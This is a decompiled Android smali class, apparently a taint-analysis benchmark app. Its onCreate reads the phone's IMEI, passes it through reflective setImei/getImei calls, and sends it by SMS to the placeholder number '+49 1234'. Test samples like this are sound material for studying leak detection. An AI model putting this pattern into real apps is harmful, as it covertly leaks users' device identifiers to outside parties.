.class public Lde/ecspride/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 13
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 18
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 19
    const/high16 v1, 0x7f030000

    invoke-virtual {p0, v1}, Lde/ecspride/MainActivity;->setContentView(I)V

    .line 22
    :try_start_0
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lde/ecspride/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/telephony/TelephonyManager;

    .line 23
    .local v12, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v12}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v8

    .line 25
    .local v8, "imei":Ljava/lang/String;
    const-string v1, "de.ecspride.ReflectiveClass"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    .line 26
    .local v6, "c":Ljava/lang/Class;
    invoke-virtual {v6}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v11

    .line 27
    .local v11, "o":Ljava/lang/Object;
    const-string v1, "setImei"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v2, v4

    invoke-virtual {v6, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    .line 28
    .local v9, "m":Ljava/lang/reflect/Method;
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object v8, v1, v2

    invoke-virtual {v9, v11, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 30
    const-string v1, "getImei"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v6, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v10

    .line 31
    .local v10, "m2":Ljava/lang/reflect/Method;
    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    invoke-virtual {v10, v11, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    .line 33
    .local v3, "s":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 34
    .local v0, "sms":Landroid/telephony/SmsManager;
    const-string v1, "+49 1234"

    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/InstantiationException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_5

    .line 54
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    .end local v3    # "s":Ljava/lang/String;
    .end local v6    # "c":Ljava/lang/Class;
    .end local v8    # "imei":Ljava/lang/String;
    .end local v9    # "m":Ljava/lang/reflect/Method;
    .end local v10    # "m2":Ljava/lang/reflect/Method;
    .end local v11    # "o":Ljava/lang/Object;
    .end local v12    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :goto_0
    return-void

    .line 35
    :catch_0
    move-exception v7

    .line 37
    .local v7, "e":Ljava/lang/InstantiationException;
    invoke-virtual {v7}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_0

    .line 38
    .end local v7    # "e":Ljava/lang/InstantiationException;
    :catch_1
    move-exception v7

    .line 40
    .local v7, "e":Ljava/lang/IllegalAccessException;
    invoke-virtual {v7}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 41
    .end local v7    # "e":Ljava/lang/IllegalAccessException;
    :catch_2
    move-exception v7

    .line 43
    .local v7, "e":Ljava/lang/ClassNotFoundException;
    invoke-virtual {v7}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto :goto_0

    .line 44
    .end local v7    # "e":Ljava/lang/ClassNotFoundException;
    :catch_3
    move-exception v7

    .line 46
    .local v7, "e":Ljava/lang/NoSuchMethodException;
    invoke-virtual {v7}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto :goto_0

    .line 47
    .end local v7    # "e":Ljava/lang/NoSuchMethodException;
    :catch_4
    move-exception v7

    .line 49
    .local v7, "e":Ljava/lang/IllegalArgumentException;
    invoke-virtual {v7}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto :goto_0

    .line 50
    .end local v7    # "e":Ljava/lang/IllegalArgumentException;
    :catch_5
    move-exception v7

    .line 52
    .local v7, "e":Ljava/lang/reflect/InvocationTargetException;
    invoke-virtual {v7}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 59
    invoke-virtual {p0}, Lde/ecspride/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f070000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 60
    const/4 v0, 0x1

    return v0
.end method
